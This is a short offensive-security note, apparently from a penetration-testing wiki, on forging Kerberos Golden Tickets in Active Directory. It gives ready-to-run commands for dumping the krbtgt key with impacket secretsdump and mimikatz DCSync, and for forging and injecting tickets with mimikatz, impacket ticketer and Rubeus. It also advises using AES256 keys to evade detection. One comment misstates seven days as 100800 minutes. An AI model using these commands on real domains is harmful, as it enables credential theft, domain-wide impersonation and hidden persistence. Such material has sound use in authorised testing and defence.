#impacket #mimikatz 
- TGTs are encrypted with the `krbtgt`'s key derived from it's password.
- `krbtgt` account password is not rotated automatically. Microsoft's best practice is to rotate every 6 months, which is more than enough time to maintain persistence.
- Password history for `krbtgt` account is maintained by the DC.
- If we get hold of this key, we can forge TGTs for any user subsequently getting access to any service as any user. These tickets are called Golden Tickets.
- This can be done using dumping credential of the domain controller or via [DC Sync](../Credential%20Dumping/DC%20Sync.md) attack.
- This can also be done by dumping the NTDS.dit file locally.
- Using impacket's secretsdump.py:
```bash
secretsdump.py 'mydomain.local/drdragon@192.168.2.2' -just-dc-user krbtgt
```
### Mimikatz
```powershell
kerberos::golden 
	/User:Administrator # user for which the TGT is generated
	/domain:<domain-FQDN>
	/sid:<domain-sid>
	/aes256:<aes256-kerberos-key>
	/id:<id> # Optional user RID. User ID should match the RID of the username specified above
	/groups:<group> # optional group ids
	/startoffset:0 # ticket availibity starts now. a negetive number means the ticket was available from past.
	/endin:600 # optional ticket lifetime (defautl is 10 years). Default AD settings for lifetime is 10 hours (600 minutes)
	/renewmax:10080 # Optional ticket lifeitme in minutes. Default AD setting is 7 days = 100800 minutes
	[/ptt(injects TGT in memory)|/ticket(saves ticket to file)]
```
### Impacket
```bash
ticketer.py -domain-sid <domainSID> -domain mydomain.local -aes <aesKey> Administrator
# This will create the TGT for the Administrator user and save it in Administrator.ccache
```
### Rubeus
```powershell
# Creates command for golden ticket by fetching information from DC using ldap
Rubeus.exe
	golden
	/aes256:<key> # AES256 key of the krbtgt account
	/ldap # make ldap query to fetch all information
	/user:Administrator # User for which golden ticket is creates
	/ptt # injects the ticket in memory
	[/printcmd] # prints the command for creating golden ticket manually using details fetched using ldap
```

---
- AES256 keys should be used to avoid any alerts or detection.
- AES keys for `krbtgt` account can also be obtained by performing [DC Sync](../Credential%20Dumping/DC%20Sync.md)
```powershell
# mimikatz
lsadump::dcsync /user:dcorp\krbtgt
```